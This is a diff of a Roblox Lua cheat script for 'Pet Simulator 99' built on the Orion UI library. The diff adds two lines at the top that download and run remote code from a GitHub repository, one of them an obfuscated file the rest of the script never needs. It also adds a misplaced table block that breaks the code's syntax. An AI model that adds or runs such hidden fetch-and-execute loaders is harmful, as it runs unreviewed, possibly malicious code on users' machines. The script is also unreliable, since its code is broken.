@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/file')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/obf_vzeDpyydOL9JV352jaoQMD64kLF0yqc429RW9yhQl7me6SlKM3w7eiW77R3nf27D.lua')))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Pet Simulator 99 - Bearr📜", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 local Tab = Window:MakeTab({
@@ -8,6 +10,10 @@ local Tab = Window:MakeTab({
 local Section = Tab:AddSection({
 	Name = "Color Event"
 })
+    ScreenGui = {
+        IgnoreGuiInset = false, -- Consider the top bar on mobile devices
+        SizeConstraint = "RelativeXY" -- Makes the UI scale properly on mobile devices
+    },
 Tab:AddButton({
 	Name = "AUTOFARM SCRIPT(UPDATED)",
 	Callback = function()
